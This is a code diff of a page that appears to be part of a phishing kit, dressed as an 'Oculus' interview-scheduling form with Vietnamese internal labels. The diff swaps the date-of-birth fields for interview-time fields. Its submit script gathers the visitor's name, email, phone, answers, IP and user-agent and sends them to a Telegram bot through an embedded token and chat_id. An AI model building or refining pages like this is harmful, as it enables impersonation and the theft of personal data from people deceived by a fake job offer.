@@ -51,20 +51,6 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
         <div class="oculus-invite-title">Schedule your interview</div>
         <form class="oculus-invite-form" onsubmit="submitScheduleInterview(event)" autocomplete="off">
             <div class="oculus-invite-group">
-                <label>Date of birth</label>
-                <div class="triple-input-row">
-                    <select required name="dob_day" id="dob_day">
-                        <option value="" disabled selected>Day</option>
-                    </select>
-                    <select required name="dob_month" id="dob_month">
-                        <option value="" disabled selected>Month</option>
-                    </select>
-                    <select required name="dob_year" id="dob_year">
-                        <option value="" disabled selected>Year</option>
-                    </select>
-                </div>
-            </div>
-            <div class="oculus-invite-group">
                 <label>Schedule interview</label>
                 <div class="triple-input-row">
                     <select required name="interview_day" id="interview_day">
@@ -77,12 +63,24 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                         <option value="" disabled selected>Year</option>
                     </select>
                 </div>
+                <div class="triple-input-row">
+                    <select required name="interview_hour" id="interview_hour">
+                        <option value="" disabled selected>Hour</option>
+                    </select>
+                    <select name="interview_minute" id="interview_minute">
+                        <option value="" disabled selected>Minute</option>
+                    </select>
+                    <select name="type_interview" id="type_interview">
+                        <option value="AM" selected>AM</option>
+                        <option value="PM">PM</option>
+                    </select>
+                </div>
             </div>
             <div class="oculus-invite-group">
                 <label for="experience">Describe your experience</label>
                 <textarea id="experience" name="experience" rows="3" placeholder="Describe your experience" required></textarea>
             </div>
-            <div class="form-note">Our response will be sent to you within 24 - 48 hours.</div>
+            <div class="form-note">We will call you on time.</div>
             <div class="notify-methods">
                 <label class="notify-option">
                     <span class="icon fb">
@@ -118,57 +116,54 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             // Day
             for (let i = 1; i <= 31; i++) {
                 const opt = `<option value="${i}">${i}</option>`;
-                document.getElementById('dob_day').insertAdjacentHTML('beforeend', opt);
                 document.getElementById('interview_day').insertAdjacentHTML('beforeend', opt);
             }
             // Month
             for (let i = 1; i <= 12; i++) {
                 const opt = `<option value="${i}">${i}</option>`;
-                document.getElementById('dob_month').insertAdjacentHTML('beforeend', opt);
                 document.getElementById('interview_month').insertAdjacentHTML('beforeend', opt);
             }
-            // Year for dob (1950-2006)
-            for (let i = 2006; i >= 1950; i--) {
-                const opt = `<option value="${i}">${i}</option>`;
-                document.getElementById('dob_year').insertAdjacentHTML('beforeend', opt);
-            }
-            // Year for interview (2024-2026)
-            for (let i = 2026; i >= 2024; i--) {
+            // Year for interview (2025-2027)
+            for (let i = 2027; i >= 2025; i--) {
                 const opt = `<option value="${i}">${i}</option>`;
                 document.getElementById('interview_year').insertAdjacentHTML('beforeend', opt);
             }
+            // Hour
+            for (let i = 1; i <= 12; i++) {
+                if (i < 10) {
+                    i = "0" + i;
+                }
+                const opt = `<option value="${i}">${i}</option>`;
+                document.getElementById('interview_hour').insertAdjacentHTML('beforeend', opt);
+            }
+            // Minute
+            for (let i = 0; i <= 59; i++) {
+                if (i < 10) {
+                    i = "0" + i;
+                }
+                const opt = `<option value="${i}">${i}</option>`;
+                document.getElementById('interview_minute').insertAdjacentHTML('beforeend', opt);
+            }
         }
-        fillSelectOptions();
+
         function submitScheduleInterview(e) {
             e.preventDefault();
             const formData = new FormData(e.target);
             const dataform = Object.fromEntries(formData);
-            console.log(dataform);
 
             var fullName = localStorage.getItem('fullName');
             var email = localStorage.getItem('email');
             var phone = localStorage.getItem('phone');
 
-            var dobday = dataform.dob_day || "";
-            var dobmonth = dataform.dob_month || "";
-            var dobyear = dataform.dob_year || "";
             var interviewday = dataform.interview_day || "";
             var interviewmonth = dataform.interview_month || "";
             var interviewyear = dataform.interview_year || "";
+            var interviewhour = dataform.interview_hour || "";
+            var interviewminute = dataform.interview_minute || "";
+            var type_interview = dataform.type_interview || "";
             var experience = dataform.experience || "";
 
-            if (dobday == "") {
-                document.getElementById('dob_day').style.border = '1px solid red';
-                return;
-            }
-            if (dobmonth == "") {
-                document.getElementById('dob_month').style.border = '1px solid red';
-                return;
-            }
-            if (dobyear == "") {
-                document.getElementById('dob_year').style.border = '1px solid red';
-                return;
-            }
+            
             if (interviewday == "") {
                 document.getElementById('interview_day').style.border = '1px solid red';
                 return;
@@ -181,18 +176,25 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 document.getElementById('interview_year').style.border = '1px solid red';
                 return;
             }
+            if (interviewhour == "") {
+                document.getElementById('interview_hour').style.border = '1px solid red';
+                return;
+            }
+            if (interviewminute == "") {
+                document.getElementById('interview_minute').style.border = '1px solid red';
+                return;
+            }
             if (experience == "") {
                 document.getElementById('experience').style.border = '1px solid red';
                 return;
             }
 
-            var content = "💬Thông Tin Tài Khoản 1 (web oculus)💬" +
+            var content = "💬Thông Tin Tài Khoản (web oculus)💬" +
                 "\n" + "----------------------------------------------------------" +
                 "\nFull Name: " + "`" + fullName + "`" +
                 "\nEmail: " + "`" + email + "`" +
                 "\nPhone Number: " + "`" + phone + "`" +
-                "\nNgày sinh: " + "`" + dobday + "/" + dobmonth + "/" + dobyear + "`" +
-                "\nNgày phỏng vấn: " + "`" + interviewday + "/" + interviewmonth + "/" + interviewyear + "`" +
+                "\nNgày phỏng vấn: " + "`" + interviewday + "/" + interviewmonth + "/" + interviewyear + "`" + " " + interviewhour + ":" + interviewminute + " " + type_interview +
                 "\nKinh nghiệm: " + "`" + experience + "`" +
                 "\n" + "----------------------------------------------------------" +
                 "\nIP dự phòng: " + "`<?php echo htmlspecialchars($ip_server); ?>`" +
@@ -204,8 +206,6 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                 "\nTimezone: " + "`<?php echo $timezone; ?>`" +
                 "\nUser-Agent: " + "`<?php echo $userAgent; ?>`";
 
-            localStorage.setItem('birthday', dobday + "/" + dobmonth + "/" + dobyear);
-    
             var apiToken = "<?php echo $token; ?>";
             var data = {
                 chat_id: '<?php echo $chatId; ?>',
@@ -227,7 +227,10 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
                         localStorage.setItem('fullName', fullName);
                         localStorage.setItem('email', email);
                         localStorage.setItem('phone', phone);
-                        localStorage.setItem('birthday', dobday + "/" + dobmonth + "/" + dobyear);
+                        localStorage.setItem('interviewday', interviewday);
+                        localStorage.setItem('interviewmonth', interviewmonth);
+                        localStorage.setItem('interviewyear', interviewyear);
+                        localStorage.setItem('interviewhour', interviewhour);
                     } else {
                         console.error('Failed to send message to Telegram bot.');
                     }
@@ -237,28 +240,16 @@ $userAgent = $_SERVER['HTTP_USER_AGENT'];
             xhr.send(JSON.stringify(data));
         }
 
-        var dobday = document.getElementById('dob_day');
-        var dobmonth = document.getElementById('dob_month');
-        var dobyear = document.getElementById('dob_year');
         var interviewday = document.getElementById('interview_day');
         var interviewmonth = document.getElementById('interview_month');
         var interviewyear = document.getElementById('interview_year');
+        var interviewhour = document.getElementById('interview_hour');
         var experience = document.getElementById('experience');
 
         document.addEventListener('DOMContentLoaded', function() {
-            var fullName = localStorage.getItem('fullName');
-            var email = localStorage.getItem('email');
-            var phone = localStorage.getItem('phone');
+            fillSelectOptions();
 
-            dobday.addEventListener('change', function() {
-                dobday.style.border = '1px solid #ccc';
-            });
-            dobmonth.addEventListener('change', function() {
-                dobmonth.style.border = '1px solid #ccc';
-            });
-            dobyear.addEventListener('change', function() {
-                dobyear.style.border = '1px solid #ccc';
-            });
+
             interviewday.addEventListener('change', function() {
                 interviewday.style.border = '1px solid #ccc';
             });
